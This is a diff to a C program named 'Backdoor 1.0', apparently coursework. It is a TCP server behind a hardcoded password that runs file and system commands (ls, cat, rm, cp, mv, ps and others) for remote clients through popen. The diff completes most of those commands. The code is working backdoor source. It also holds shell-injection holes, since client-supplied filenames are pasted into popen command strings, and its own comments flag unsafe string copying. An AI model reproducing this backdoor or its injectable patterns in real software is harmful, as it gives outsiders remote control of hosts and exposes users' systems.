@@ -11,11 +11,11 @@
 /*****************************
 *	Commands || Status		 *
 *	pwd		 ||	Complete	 *
-*	cd		 ||	Not Complete *
+*	cd		 ||	Complete 	 *
 *	ls		 ||	Complete	 *
-*	cp		 ||	Partial 	 *
-*	mv		 ||	Partial 	 *
-*	rm		 ||	Partial	     *
+*	cp		 ||	Complete 	 *
+*	mv		 ||	Complete 	 *
+*	rm		 ||	Complete	 *
 *	cat		 ||	Complete	 *
 *	snap	 ||	Not Complete *
 *	diff	 ||	Not Complete *
@@ -51,9 +51,8 @@
 struct {
     int port; // listening port
 	char password[32]; // required password
-    char buffer[BUFFSIZE]; // temporary buffer for input
-	char temp[BUFFSIZE];
-    //char secret[1024]; // the secret to reveal
+    char buffer[BUFFSIZE]; // Input buffer
+	char dir[BUFFSIZE]; // Directory buffer
 } globals;
 
 // report error message & exit
@@ -102,14 +101,38 @@ int main( int argc, char ** argv)
 	int off = 0;
 	int logout;
 	FILE *fp;
+	/* Satus code for popen */
 	int status;
+	/* Just some buffer */
 	char buff[BUFFSIZE];
+	/* Token for strtok */
+	char *token;
+	/* Filenames */
+	char file1[32];
+	char file2[32];
     // parse command line arguments
     if( argc != 2) die( "Usage: server port");
     char * end = NULL;
     globals.port = strtol( argv[1], & end, 10);
     if( * end != 0) die( "bad port %s", argv[1]);
+	/* Hard code password */	
 	strcpy(globals.password, "pass");
+	/* Get current directory */
+	fp = popen("pwd", "r");
+	if (fp == NULL) {
+		/* Error */
+		die("File pointer = NULL");
+	}
+	fgets(globals.dir, BUFFSIZE, fp);
+	status = pclose(fp);
+	if (status == -1) {
+		/* Error */
+		die("Error in initial pclose: %s", strerror(errno));
+	}
+	else {
+		printf("Backdoor directory: %s", globals.dir);
+	}
+
     // create a listenning socket on a given port
     struct sockaddr_in servaddr;
     int listenSockFd = socket(AF_INET, SOCK_STREAM, 0);
@@ -151,10 +174,11 @@ int main( int argc, char ** argv)
             printf( "Password entered correctly.\n");
 			writeStrToFd( connSockFd, "Password entered correctly.\nBackdoor 1.0\n");
 			logout = 0;
-			/**************
-			* Listen Here *
-			**************/
+			/***************
+			* Connect Here *
+			***************/
 			while(!logout) {
+				buff[0] = '\0';
 				writeStrToFd( connSockFd, "Please enter a command: ");
 				readLineFromFd( connSockFd, globals.buffer, length);
 				/* pwd: Return the current working directory */
@@ -170,16 +194,36 @@ int main( int argc, char ** argv)
 					}
 					status = pclose(fp);
 					if (status == -1) {
-						/* Error */
 						die("Error in pwd pclose: %s", strerror(errno));
 					}
+					else if (status == 0) {
+						printf("pwd status code: %d\n", status);
+						printf("Execution successful\n");
+					}
 					else {
-						/* Check status codes */
+						printf("pwd status code: %d\n", status);
+						printf("Execution unsuccessful\n");
+						writeStrToFd(connSockFd, "Error in pwd execution\n");
 					}
 				}
 				/* cd <dir>: Change the current working directory to <dir> */
 				else if (strncmp(globals.buffer, "cd", 2) == 0) {
 					/* Add code */
+					strncpy(buff, globals.buffer + 3, BUFFSIZE - 3);
+					status = chdir(buff);
+					printf("%s\n", buff);
+					if (status == -1) {
+						/* For some reason having \n in the first write doesn't do anyting */
+						printf("Error in chdir: %s\n", strerror(errno));
+						writeStrToFd(connSockFd, ("%s", strerror(errno)));
+						writeStrToFd(connSockFd, "\n");
+					}
+					else {
+						printf("Directory change\n");
+						writeStrToFd(connSockFd, "Directory changed to ");
+						writeStrToFd(connSockFd, ("%s", buff));
+						writeStrToFd(connSockFd, "\n");
+					}
 				}
 				/* ls: List the contents of the current working directory */
 				else if (strcmp(globals.buffer, "ls") == 0) {
@@ -195,64 +239,131 @@ int main( int argc, char ** argv)
 					if (status == -1) {
 						die("Error in ls pclose: %s", strerror(errno));
 					}
+					else if (status == 0){
+						printf("ls status code: %d\n", status);
+						printf("Execution successful\n");
+					}
 					else {
-						/* Check status codes */
+						printf("ls status code: %d\n", status);
+						printf("Execution unsuccessful\n");
+						writeStrToFd(connSockFd, "Error in ls execution\n");
 					}
 				}
 				/* cp <file1> <file2>: Copy <file> to <file2> */
 				else if (strncmp(globals.buffer, "cp", 2) == 0) {
-					if (strncmp(globals.buffer, "cp ", 3) == 0) {
-						fp = popen(globals.buffer, "r");
-						if (fp == NULL) {
-							die("File pointer = NULL");
+					/*********************
+					* Extract file names *
+					*********************/
+					token = strtok(globals.buffer, " ");
+					token = strtok(NULL, " ");
+					if (token != NULL) {
+						strncpy(file1, token, 32);
+						token = strtok(NULL, " ");
+						if (token != NULL) {
+							strncpy(file2, token, 32);
+							if ((strtok(NULL, " ") != NULL)) {
+								writeStrToFd(connSockFd, "Too many parameters\nUsage: mv <file1> <file2>\n");
+							}
+							else {
+								/* 
+								* NOT Safe functions
+								* Since we limit filenames to 31 characters (plus terminating)
+								* We should be able to fit everything
+								*/
+								strcpy(buff, "cp ");
+								strcat(buff, file1);
+								strcat(buff, " ");
+								strcat(buff, file2);
+								strcat(buff, "\0");
+								fp = popen(buff, "r");
+								if (fp == NULL) {
+									die("File pointer = NULL");
+								}
+								status = pclose(fp);
+								if (status == -1) {
+									die("Error in cp pclose: %s", strerror(errno));
+								}
+								else if (status == 0) {
+									printf("cp status code: %d\n", status);
+									printf("Execution successful\n");
+									writeStrToFd(connSockFd, "File copied\n");
+								}
+								/* No such file or directory/Is a directory error */
+								else if (status == 256) {
+									writeStrToFd(connSockFd, "No such file or directory\n");
+								}
+								else {
+									printf("cp status code: %d\n", status);
+									printf("Execution unsuccessful\n");
+									writeStrToFd(connSockFd, "Error in execution\n");
+								}
+							}
 						}
-						while (fgets(buff, BUFFSIZE, fp) != NULL) {
-							printf("%s", buff);
-							writeStrToFd( connSockFd, ("%s", buff));
+						else {
+							writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\n");
 						}
-						status = pclose(fp);
-						printf("%d\n", status);
-						if (status == -1) {
-							die("Error in cp pclose: %s", strerror(errno));
+					}
+					else {
+						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\n");
+					}
+				}
+				/* mv <file1> <file2>: Rename <file1> to <file2> */
+				else if (strncmp(globals.buffer, "mv", 2) == 0) {
+					/*********************
+					* Extract file names *
+					*********************/						
+					token = strtok(globals.buffer, " ");
+					token = strtok(NULL, " ");
+					if (token != NULL) {
+						strncpy(file1, token, 32);
+						token = strtok(NULL, " ");
+						if (token != NULL) {
+							strncpy(file2, token, 32);
+							if ((strtok(NULL, " ") != NULL)) {
+								writeStrToFd(connSockFd, "Too many parameters\nUsage: mv <file1> <file2>\n");
+							}
+							else {
+								/* 
+								* NOT Safe functions
+								* Since we limit filenames to 31 characters (plus terminating)
+								* We should be able to fit everything
+								*/
+								strcpy(buff, "mv ");
+								strcat(buff, file1);
+								strcat(buff, " ");
+								strcat(buff, file2);
+								strcat(buff, "\0");
+								fp = popen(buff, "r");
+								if (fp == NULL) {
+									die("File pointer = NULL");
+								}
+								status = pclose(fp);
+								if (status == -1) {
+									die("Error in mv pclose: %s", strerror(errno));
+								}
+								else if (status == 0) {
+									printf("mv status code: %d\n", status);
+									printf("Execution successful\n");
+									writeStrToFd(connSockFd, "mv command executed\n");
+								}
+								/* No such file or directory/Is a directory error */
+								else if (status == 256) {
+									writeStrToFd(connSockFd, "No such file or directory\n");
+								}
+								else {
+									printf("mv status code: %d\n", status);
+									printf("Execution unsuccessful\n");
+									writeStrToFd(connSockFd, "Error in execution\n");
+								}
+							}
+							
 						}
-						else if (status == 0) {
-							writeStrToFd(connSockFd, "File copied\n");
-						}
-						/* No such file or directory/Is a directory error */
-						else if (status == 256) {
-							writeStrToFd(connSockFd, "Usage: mv <file1> <file2n>\n");
+						else {
+							writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
 						}
 					}
 					else {
 						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
-					}
-				}
-				/* mv <file1> <file2>: Rename <file> to <file2> */
-				else if (strncmp(globals.buffer, "mv", 2) == 0) {
-					if (strncmp(globals.buffer, "mv ", 3) == 0) {
-						fp = popen(globals.buffer, "r");
-						if (fp == NULL) {
-							die("File pointer = NULL");
-						}
-						while (fgets(buff, BUFFSIZE, fp) != NULL) {
-							printf("%s", buff);
-							writeStrToFd( connSockFd, ("%s", buff));
-						}
-						status = pclose(fp);
-						printf("%d\n", status);
-						if (status == -1) {
-							die("Error in mv pclose: %s", strerror(errno));
-						}
-						else if (status == 0) {
-							writeStrToFd(connSockFd, "File name changed\n");
-						}
-						/* No such file or directory/Is a directory error */
-						else if (status == 256) {
-							writeStrToFd(connSockFd, "Usage: mv <file> <file>\n");
-						}
-					}
-					else {
-						writeStrToFd(connSockFd, "Usage: mv <file> <file>\n");
 					}
 				}
 				/* rm <file>: Delete <file> */
@@ -263,6 +374,10 @@ int main( int argc, char ** argv)
 						}
 						else {
 							/* Remove all white space */
+							/*
+							* The point of doing this is so that only one filename exists
+							* Everything else is rejected
+							*/
 							for (int i = 4; i <BUFFSIZE; i++) {
 								if (globals.buffer[i] == ' ') {
 									for (int j = i; j < BUFFSIZE-1; j++) {
@@ -278,16 +393,24 @@ int main( int argc, char ** argv)
 								printf("%s", buff);
 								writeStrToFd( connSockFd, ("%s", buff));
 							}
-							printf("File deleted\n");
-							writeStrToFd(connSockFd, "File deleted\n");
 							status = pclose(fp);
 							if (status == -1) {
 								die("Error in rm pclose: %s", strerror(errno));
 							}
+							else if (status == 0) {
+								printf("rm status code: %d\n", status);
+								printf("Execution successful\n");
+								writeStrToFd(connSockFd, "File deleted\n");
+							}
 							/* No such file or directory/Is a directory error */
 							else if (status == 256) {
 								writeStrToFd(connSockFd, "No such file\n");
-							}	
+							}
+							else {
+								printf("rm status code: %d\n", status);
+								printf("Execution unsuccessful\n");
+								writeStrToFd(connSockFd, "Error in execution\n");
+							}
 						}
 					}
 					else {
@@ -302,6 +425,10 @@ int main( int argc, char ** argv)
 						}
 						else {
 							/* Remove all white space */
+							/*
+							* The point of doing this is so that only one filename exists
+							* Everything else is rejected
+							*/
 							for (int i = 5; i <BUFFSIZE; i++) {
 								if (globals.buffer[i] == ' ') {
 									for (int j = i; j < BUFFSIZE-1; j++) {
@@ -323,10 +450,19 @@ int main( int argc, char ** argv)
 							if (status == -1) {
 								die("Error in cat pclose: %s", strerror(errno));
 							}
+							else if (status == 0) {
+								printf("cat status code: %d\n", status);
+								printf("Execution successful\n");
+							}
 							/* No such file or directory/Is a directory error */
 							else if (status == 256) {
 								writeStrToFd(connSockFd, "No such file\n");
-							}	
+							}
+							else {
+								printf("cat status code: %d\n", status);
+								printf("Execution unsuccessful\n");
+								writeStrToFd(connSockFd, "Error in execution\n");
+							}
 						}
 					}
 					else {
@@ -334,7 +470,7 @@ int main( int argc, char ** argv)
 					}
 				}	
 				/* snap: Take snapshot of all files in the current directory and store it in memory */
-				else if (strcmp(globals.buffer, "sanp") == 0) {
+				else if (strcmp(globals.buffer, "snap") == 0) {
 					/* Add code */
 				}
 				/* diff: Compare the contents of the current directory to the saved sanpshot */
@@ -355,8 +491,14 @@ int main( int argc, char ** argv)
 					if (status == -1) {
 						die("Error in who pclose: %s", strerror(errno));
 					}
+					else if (status == 0) {
+						printf("who status code: %d\n", status);
+						printf("Execution successful\n");
+					}
 					else {
-						/* Check status codes */
+						printf("who status code: %d\n", status);
+						printf("Execution unsuccessful\n");
+						writeStrToFd(connSockFd, "Error in execution\n");
 					}
 				}
 				/* ps: Show currently running processes */
@@ -373,8 +515,14 @@ int main( int argc, char ** argv)
 					if (status == -1) {
 						die("Error in ps pclose: %s", strerror(errno));
 					}
+					else if (status == 0) {
+						printf("ps status code: %d\n", status);
+						printf("Execution successful\n");
+					}
 					else {
-						/* Check status codes */
+						printf("ps status code: %d\n", status);
+						printf("Execution unsuccessful\n");
+						writeStrToFd(connSockFd, "Error in execution\n");
 					}
 				}
 				/* help: print list of commands, or print specified command function */
@@ -391,56 +539,56 @@ int main( int argc, char ** argv)
 					}
 					else if (strcmp(globals.buffer, "help cd") == 0) {
 						printf("Help command entered: cd command.\n");
-						writeStrToFd(connSockFd, "Usage: cd <dir>.\nChange the current working directory to <dir>.\n");
+						writeStrToFd(connSockFd, "Usage: cd <dir>\nChange the current working directory to <dir>.\n");
 					}
 					else if (strcmp(globals.buffer, "help ls") == 0) {
 						printf("Help command entered: ls command.\n");
-						writeStrToFd(connSockFd, "Usage: ls.\nList the contents of the current working directory.\n");
+						writeStrToFd(connSockFd, "Usage: ls\nList the contents of the current working directory.\n");
 					}
 					else if (strcmp(globals.buffer, "help cp") == 0) {
 						printf("Help command entered: cp command.\n");
-						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>.\nCopy <file1> to <file2>.\n");
+						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\nCopy <file1> to <file2>.\nCopy <file> to <dir>.\n");
 					}
 					else if (strcmp(globals.buffer, "help mv") == 0) {
 						printf("Help command entered: mv command.\n");
-						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>.\nRename <file1> to <file2>.\n");
+						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\nRename <file1> to <file2>.\nMove <file> to <dir>.\n");
 					}
 					else if (strcmp(globals.buffer, "help rm") == 0) {
 						printf("Help command entered: rm command.\n");
-						writeStrToFd(connSockFd, "Usage: rm <file>.\nDelete <file>.\n");
+						writeStrToFd(connSockFd, "Usage: rm <file>\nDelete <file>.\n");
 					}
 					else if (strcmp(globals.buffer, "help cat") == 0) {
 						printf("Help command entered: cat command.\n");
-						writeStrToFd(connSockFd, "Usage: cat <file>.\nReturn contents of the file.\n");
+						writeStrToFd(connSockFd, "Usage: cat <file>\nReturn contents of the file.\n");
 					}
 					else if (strcmp(globals.buffer, "help snap") == 0) {
 						printf("Help command entered: snap command.\n");
-						writeStrToFd(connSockFd, "Usage: snap.\nTake snapshot of all the files in the current directory and store it in memory.\n");
+						writeStrToFd(connSockFd, "Usage: snap\nTake snapshot of all the files in the current directory and store it in memory.\n");
 					}
 					else if (strcmp(globals.buffer, "help diff") == 0) {
 						printf("Help command entered: diff command.\n");
-						writeStrToFd(connSockFd, "Usage: diff.\nCompare the contents of the current directory to the saved snapshot.\n");
+						writeStrToFd(connSockFd, "Usage: diff\nCompare the contents of the current directory to the saved snapshot.\n");
 					}
 					else if (strcmp(globals.buffer, "help logout") == 0) {
 						printf("Help command entered: logout command.\n");
-						writeStrToFd(connSockFd, "Usage: logout.\nDisconnect from the server.\n");
+						writeStrToFd(connSockFd, "Usage: logout\nDisconnect from the server.\n");
 					}
 					else if (strcmp(globals.buffer, "help off") == 0) {
 						printf("Help command entered: off command.\n");
-						writeStrToFd(connSockFd, "Usage: off.\nTerminate the backdoor program.\n");
+						writeStrToFd(connSockFd, "Usage: off\nTerminate the backdoor program.\n");
 					}
 					else if (strcmp(globals.buffer, "help who") == 0) {
 						printf("Help command entered: who command.\n");
-						writeStrToFd(connSockFd, "Usage: who.\nList user[s] currently logged in.\n");
+						writeStrToFd(connSockFd, "Usage: who\nList user[s] currently logged in.\n");
 					}
 					else if (strcmp(globals.buffer, "help ps") == 0) {
 						printf("Help command entered: ps command.\n");
-						writeStrToFd(connSockFd, "Usage: ps.\nShow currently running processes.\n");
+						writeStrToFd(connSockFd, "Usage: ps\nShow currently running processes.\n");
 					}
 					/* help: Incorrect usage */
 					else {
 						printf("Help command entered: Incorrect usage.\n");
-						writeStrToFd(connSockFd, "Usage: help or help <command>.\n");
+						writeStrToFd(connSockFd, "Usage: help or help <command>\n");
 					}
 				}
 				/* logout: Logout the user */
@@ -471,6 +619,8 @@ int main( int argc, char ** argv)
         // close the connection
         close( connSockFd);
     }
+	/* Return working directory back to initial */
+	//chdir(globals.dir);
 	// close the socket
     close( listenSockFd);
     return 0;
